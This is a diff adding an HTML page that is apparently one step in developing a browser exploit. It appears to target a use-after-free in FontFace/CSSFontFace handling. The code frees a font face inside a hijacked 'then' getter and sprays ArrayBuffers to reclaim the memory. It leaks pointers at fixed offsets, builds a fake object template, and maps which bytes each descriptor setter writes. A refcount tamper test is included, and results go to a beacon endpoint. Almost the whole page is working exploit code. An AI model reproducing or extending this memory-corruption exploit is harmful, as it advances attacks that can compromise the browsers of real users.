@@ -1,0 +1,326 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1219 FontFace descriptor write-through</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:13px/1.4 'Courier New',monospace;padding:10px}
+#s{font-size:18px;font-weight:bold;color:#ffd75e;padding:8px 0}
+#r{color:#ff55c8;white-space:pre-wrap;word-break:break-all;font-size:12px;line-height:1.6}
+</style>
+</head><body>
+<div id="s">P1219 BOOTING...</div>
+<div id="r"></div>
+<script>
+'use strict';
+/* ═══════════════════════════════════════════════════════════════════
+   P1219: FontFace descriptor write-through mapping
+
+   P1218 confirmed:
+   - check() and layout don't read from non-pointer offsets
+   - No crash on unmapped pointers at any offset (engine doesn't deref)
+   - Descriptors read from JS wrapper cache, not C++ CSSFontFace
+   - .loaded promise resolves fine
+
+   NEW APPROACH: Use FontFace descriptor SETTERS to write THROUGH
+   the m_backing pointer into our controlled buffer. Map which bytes
+   change for each setter to determine the CSSFontFace layout.
+
+   Also try: FontFace.load(), creating CSS @font-face rules that
+   reference our fake face's family, and document.fonts.load().
+   ═══════════════════════════════════════════════════════════════════ */
+
+var S=document.getElementById('s'),R=document.getElementById('r');
+function msg(t){R.textContent+=(R.textContent?'\n':'')+t;}
+
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1219-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+window.onerror=function(m,s,l){B('ERR',m+'@'+l);};
+
+var K=8,SIZE=192;
+var styleEl=null,firedHere=false;
+var leaked={p58:null,p68:null};
+var templateBuf=null;
+
+function hex(v){return('0'+v.toString(16)).slice(-2);}
+function hexq(arr){if(!arr)return'null';var s='0x';for(var i=7;i>=0;i--)s+=hex(arr[i]);return s;}
+function grab(view,off){var a=[];for(var i=0;i<8;i++)a.push(view[off+i]);return a;}
+function setq(view,off,arr){for(var i=0;i<8;i++)view[off+i]=arr[i];}
+
+function setupFace(name,cssName,range){
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face{font-family:"+cssName+";src:local(Arial);unicode-range:"+range+";}";
+  document.head.appendChild(styleEl);
+  var A=new FontFace(name,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A);void A.loaded;
+  if(!window.__alive)window.__alive=[];
+  window.__alive.push(A);
+}
+
+function installGetter(fillTemplate){
+  firedHere=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(firedHere)return undefined;
+      firedHere=true;
+      if(styleEl)styleEl.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      styleEl=null;
+      document.body.offsetHeight;
+      window.__map=[];
+      for(var k=0;k<K;k++){
+        var ab=new ArrayBuffer(SIZE);
+        var v=new Uint8Array(ab);
+        if(fillTemplate&&leaked.p58){
+          setq(v,0x00,[0x01,0,0,0,0,0,0,0]);
+          setq(v,0x58,leaked.p58);
+          setq(v,0x68,leaked.p68);
+        }
+        window.__map.push({size:SIZE,view:v,ab:ab});
+      }
+      try{document.fonts.check('1em s0');}catch(e){}
+      return undefined;
+    },
+    set:function(){}
+  });
+}
+
+S.textContent='P1219 S1...';
+B('START','s1');
+window.__alive=[];
+setupFace('f0','s0','U+0042');
+installGetter(false);
+document.fonts.load('1em f0, s0','AB').then(function(){},function(){});
+
+setTimeout(function(){
+  var m=window.__map;if(!m||!m.length){setTimeout(function(){location.reload();},500);return;}
+  var best=-1,nz=0;
+  for(var i=0;i<m.length;i++){var v=m[i].view,n=0;for(var j=0;j<v.length;j++)if(v[j]!==0)n++;if(n>nz){nz=n;best=i;}}
+  if(best<0){B('S1-CLEAN','retry');setTimeout(function(){location.reload();},500);return;}
+  var v=m[best].view;
+  leaked.p58=grab(v,0x58);leaked.p68=grab(v,0x68);
+  B('S1-HIT','b'+best+'|p58='+hexq(leaked.p58)+'|p68='+hexq(leaked.p68));
+  msg('S1 HIT: p58='+hexq(leaked.p58)+' p68='+hexq(leaked.p68));
+  setTimeout(runS2,200);
+},60);
+
+setTimeout(function(){
+  if(leaked.p58)return;
+  var m=window.__map;if(!m||!m.length)return;
+  var best=-1,nz=0;
+  for(var i=0;i<m.length;i++){var v=m[i].view,n=0;for(var j=0;j<v.length;j++)if(v[j]!==0)n++;if(n>nz){nz=n;best=i;}}
+  if(best<0)return;
+  leaked.p58=grab(m[best].view,0x58);leaked.p68=grab(m[best].view,0x68);
+  B('S1-HIT2','p58='+hexq(leaked.p58)+'|p68='+hexq(leaked.p68));
+  setTimeout(runS2,200);
+},400);
+setTimeout(function(){if(!leaked.p58){B('S1-TIMEOUT','retry');setTimeout(function(){location.reload();},500);}},2000);
+
+
+/* ═══════ STAGE 2: Template ═══════ */
+function runS2(){
+  B('S2-START','go');
+  S.textContent='S2: TEMPLATE...';
+  setupFace('f1','s1','U+0043');
+  installGetter(true);
+  document.fonts.load('1em f1, s1','AB').then(function(){
+    B('S2-OK','resolved');
+    var m2=window.__map;
+    for(var i=0;i<m2.length;i++){
+      var v=m2[i].view;
+      if(v[0]===1&&v[1]===0){
+        var match=true;
+        for(var b=0;b<8;b++)if(v[0x58+b]!==leaked.p58[b]){match=false;break;}
+        if(match){templateBuf=m2[i];B('S2-FOUND','buf'+i);break;}
+      }
+    }
+    setTimeout(runS3,300);
+  },function(){B('S2-FAIL','rejected');});
+}
+
+
+/* ═══════ STAGE 3: Descriptor write-through experiments ═══════ */
+function runS3(){
+  if(!templateBuf){B('S3-NOBUF','err');return;}
+  B('S3-START','go');
+  S.textContent='S3: WRITE EXPERIMENTS...';
+  msg('');msg('=== STAGE 3: Descriptor writes ===');
+
+  var tv=templateBuf.view;
+  var bv=new BigUint64Array(templateBuf.ab);
+
+  /* Find the FontFace wrapper for f1 */
+  var ff1=null;
+  for(var i=0;i<window.__alive.length;i++){
+    if(window.__alive[i].family==='f1'){ff1=window.__alive[i];break;}
+  }
+  if(!ff1){
+    document.fonts.forEach(function(f){if(f.family==='f1')ff1=f;});
+  }
+  if(!ff1){B('S3-NOFF1','err');msg('no ff1 found');return;}
+  B('S3-FF1','found');
+
+  /* Take snapshot before each setter test */
+  function snapshot(){
+    var s=new Uint8Array(SIZE);
+    for(var i=0;i<SIZE;i++)s[i]=tv[i];
+    return s;
+  }
+  function diffSnapshot(before,after){
+    var d=[];
+    for(var i=0;i<SIZE;i++){
+      if(before[i]!==after[i])d.push('+0x'+hex(i>>4)+hex(i&0xf)+'='+hex(before[i])+'->'+hex(after[i]));
+    }
+    return d;
+  }
+
+  /* ─── 3A: Try each FontFace descriptor setter ─── */
+  var setterTests=[
+    ['style','italic'],
+    ['weight','bold'],
+    ['weight','900'],
+    ['stretch','condensed'],
+    ['display','swap'],
+    ['display','block'],
+    ['display','fallback'],
+    ['unicodeRange','U+0-FF']
+  ];
+
+  var allResults=[];
+  for(var ti=0;ti<setterTests.length;ti++){
+    var prop=setterTests[ti][0],val=setterTests[ti][1];
+    var before=snapshot();
+    var setOk=false,errMsg='';
+    try{
+      ff1[prop]=val;
+      setOk=true;
+    }catch(e){
+      errMsg=e.message.slice(0,50);
+    }
+    var after=snapshot();
+    var diffs=diffSnapshot(before,after);
+
+    var result=prop+'='+val+':'+(setOk?'ok':'ERR:'+errMsg)+'|diffs='+(diffs.length>0?diffs.join(','):'none');
+    allResults.push(result);
+    msg(result);
+
+    if(diffs.length>0){
+      B('S3-WRITE-'+prop,val+'|'+diffs.join(','));
+    }
+  }
+  B('S3-SETTERS',allResults.join('||').slice(0,900));
+
+  /* ─── 3B: Try ff1.load() and check for writes ─── */
+  var beforeLoad=snapshot();
+  try{
+    ff1.load().then(function(){
+      var afterLoad=snapshot();
+      var ld=diffSnapshot(beforeLoad,afterLoad);
+      B('S3-LOAD',ld.length>0?ld.join(','):'none');
+      msg('load() diffs: '+(ld.length>0?ld.join(','):'none'));
+    }).catch(function(e){
+      B('S3-LOAD-ERR',e.message);
+    });
+  }catch(e){
+    B('S3-LOAD-EX',e.message);
+    msg('load() threw: '+e.message);
+  }
+
+  /* ─── 3C: Create a NEW CSS @font-face that references 'f1' family ─── */
+  /* This might force the CSS font matching to walk our fake CSSFontFace */
+  var beforeCSS=snapshot();
+  try{
+    var st2=document.createElement('style');
+    st2.textContent="@font-face{font-family:f1;src:local(serif);font-style:italic;}";
+    document.head.appendChild(st2);
+
+    var sp=document.createElement('span');
+    sp.style.cssText='font-family:f1;font-size:48px;font-style:italic;position:absolute;left:-9999px';
+    sp.textContent='TEST';
+    document.body.appendChild(sp);
+    void sp.offsetWidth;
+
+    var afterCSS=snapshot();
+    var cssDiffs=diffSnapshot(beforeCSS,afterCSS);
+    B('S3-CSS',cssDiffs.length>0?cssDiffs.join(','):'none');
+    msg('CSS match diffs: '+(cssDiffs.length>0?cssDiffs.join(','):'none'));
+  }catch(e){
+    B('S3-CSS-ERR',e.message);
+  }
+
+  /* ─── 3D: Try document.fonts.delete on our wrapper ─── */
+  /* Deleting the FontFace might call CSSFontFace methods */
+  var beforeDel=snapshot();
+  try{
+    var delResult=document.fonts.delete(ff1);
+    var afterDel=snapshot();
+    var delDiffs=diffSnapshot(beforeDel,afterDel);
+    B('S3-DELETE','result='+delResult+'|diffs='+(delDiffs.length>0?delDiffs.join(','):'none'));
+    msg('delete result='+delResult+' diffs: '+(delDiffs.length>0?delDiffs.join(','):'none'));
+  }catch(e){
+    B('S3-DEL-ERR',e.message);
+  }
+
+  /* ─── 3E: Refcount experiment ─── */
+  /* What happens if we set refcount to 0? Might trigger deref/destructor */
+  var beforeRef=snapshot();
+  tv[0]=0; /* refcount = 0 */
+  try{
+    /* Try to use the face — might trigger ref() which detects refcount=0 */
+    document.fonts.check('1em s1');
+    var afterRef=snapshot();
+    var refDiffs=diffSnapshot(beforeRef,afterRef);
+    B('S3-REF0','survived|diffs='+(refDiffs.length>0?refDiffs.join(','):'none'));
+    msg('refcount=0 survived! diffs: '+(refDiffs.length>0?refDiffs.join(','):'none'));
+  }catch(e){
+    B('S3-REF0-ERR',e.message);
+  }
+  tv[0]=1; /* restore refcount */
+
+  /* ─── 3F: Try adding ff1 back to document.fonts ─── */
+  try{
+    document.fonts.add(ff1);
+    B('S3-READD','ok');
+    msg('re-added ff1 to document.fonts');
+
+    /* Now try load again */
+    var beforeReload=snapshot();
+    document.fonts.load('48px f1','Z').then(function(faces){
+      var afterReload=snapshot();
+      var rlDiffs=diffSnapshot(beforeReload,afterReload);
+      B('S3-RELOADED','faces='+faces.length+'|diffs='+(rlDiffs.length>0?rlDiffs.join(','):'none'));
+      msg('re-loaded: '+faces.length+' faces, diffs: '+(rlDiffs.length>0?rlDiffs.join(','):'none'));
+    }).catch(function(e){
+      B('S3-RELOADED-ERR',e.message);
+    });
+  }catch(e){
+    B('S3-READD-ERR',e.message);
+    msg('re-add error: '+e.message);
+  }
+
+  /* ─── 3G: Full buffer dump after all experiments ─── */
+  setTimeout(function(){
+    var finalDump='';
+    for(var i=0;i<SIZE;i++){
+      if(i%16===0)finalDump+='\n+'+hex(i>>4)+hex(i&0xf)+': ';
+      finalDump+=hex(tv[i])+' ';
+    }
+    B('S3-FINAL1',finalDump.slice(0,900));
+    B('S3-FINAL2',finalDump.slice(900));
+    msg('final buffer:'+finalDump);
+
+    msg('');msg('=== P1219 COMPLETE ===');
+    S.textContent='P1219 COMPLETE';
+    B('DONE','all');
+  },2000);
+}
+
+</script>
+</body></html>
